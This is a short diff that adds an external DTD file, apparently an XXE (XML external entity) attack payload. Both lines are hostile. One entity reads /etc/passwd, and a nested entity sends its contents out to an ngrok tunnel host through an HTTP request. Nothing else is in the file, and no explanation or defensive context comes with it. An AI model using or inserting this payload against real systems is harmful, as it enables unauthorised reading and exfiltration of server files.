@@ -1,0 +1,2 @@
+<!ENTITY % p1 SYSTEM "file:///etc/passwd">
+<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://0.tcp.in.ngrok.io:18776/BLAH?%p1;'>">%p2;
